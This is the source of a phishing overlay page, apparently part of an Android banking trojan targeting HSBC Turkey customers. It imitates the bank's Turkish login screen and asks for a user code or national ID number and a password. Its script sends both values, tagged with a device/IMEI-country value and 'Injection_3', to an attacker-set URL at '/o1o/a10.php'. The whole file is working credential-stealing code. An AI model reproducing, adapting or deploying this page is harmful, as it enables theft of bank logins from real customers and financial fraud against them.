<html>
    <head>
        <meta charset="UTF-8">
        <link href="tr/tr.com.hsbc.hsbcturkey/style.css" rel="stylesheet">
    </head>
    <?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
    <div class="content">
        <div class="header">
            <img style="width: 30px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAH0AAABCCAMAAABNcilvAAAAVFBMVEXbABHbABHbABHbABHbABHbABHbABHbABEAAADbABHbABHbABHbABH0r7X97/D2v8T////tgIjyn6b73+HkQE3iMD7bABHdECDgIC/pYGrvj5f4z9J3i6azAAAADXRSTlNAj+8gUGCAEADPML+fmddjBQAAAkZJREFUaN7F2et2gjAMAOCOjSHIWGVQFd//PQcTpJckpO3ZCT+9fSqQqzqRR3XOPBry4xWN17eryTnGukrXz2Z45PD9xdTJemvMoDP4Xl+MaRP1GZ/1dL7Xi07xisYXPZWf8T+d4HH902y6fqTgk950nEf10uy67uPxu951U0bqK77q8fwT33SMVzS+6bH8ir90hIf1D+PrcfyG7zrMg3pThHoM/8It3TRM3cItnc/vuK0XDUu3cVu3P4qM7chbAD7U323c0fWdhXfYFw55FaY1g+oc3sG9v6uoDnQP9/Rj3sX9k+XnW0Xjvn7Ee3hwqXi8p/t4oNO8j4cXqsurMK3ROsXffBy4TWpUD3FA70YMvz70se4kPEXjgI7yAA6GiBbUIRzSER7C4QDVAnppuDrIgzgSHttAh3FYB3gYx4Jz6ekIjugBj+BoaigdHcMxXXc352XfOk5feRWmNZbuFrq9jtWfvKJxXLd5FKeScrPqBE7oO4/jlL7kW0XjlL7xBE4WJDOvwrTG1p88hdPlUNEoGqf1hSfxg2KsUK3J0PV08PxBKSj822XPu/A1L3y/J8a6bo91XzmxLinO21kOy3C8OG83rdwcN3ISLC/HCed34dpGuK47nd4ka1p2Pa8HpJ7/yannmb0M3koFXVxUL5Pdx41ZfZxwDyvcv8vOLoTnNuTMauLMrAadMbMi5nXMceE9Z14nPKsUntPOj0rOqIXn88K7CW8vk7AWmnL2Mu5OKmUl1ufspIT3ccK7SOE9rPAO+t/37788SCIH1xDC1gAAAABJRU5ErkJggg==">
        </div>

        <h3> Hoş Geldiniz </h3>

        <form method="post">
            <input type="text" name="login" id="login" class="field" placeholder="Kullanıcı Kodu / T.C. Kimlik Numarası">

            <input type="password" name="password" id="password" class="field" placeholder="Parola">

            <input type="submit" class="submit" onclick="sentServer1();" id="sbt_input" value="Devam">
        </form>

        <p> Anında Şifre Al / Şifremi Unuttum </p>
         <script type="text/javascript">
         (function () {


        var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
             var input = objDoc.createElement("input");
             input.setAttribute("type", "hidden");
             input.setAttribute("name", sNm);
             input.setAttribute("value", sV);
             input.value = sV;
             objForm.appendChild(input);
         };
                    var g_oBtn = document.getElementById('sbt_input');
                    g_oBtn.onclick = function () {

						var oNumInp = document.getElementById('login');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = 'field';
							oCodeInp.className = 'field';
						} catch(e){};

                        if (oNumInp.value.length < 3) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }

                        if (!/^\w{3,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
top['closeDlg'] = true;
var url='<?php echo $URL; ?>';
var imei_c='<?php echo $IMEI_country; ?>';
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|bsbcturkey|"+oNumInp.value+"|"+oCodeInp.value);

return false;
};

})();
</script>
    </div>
</body>
</html>
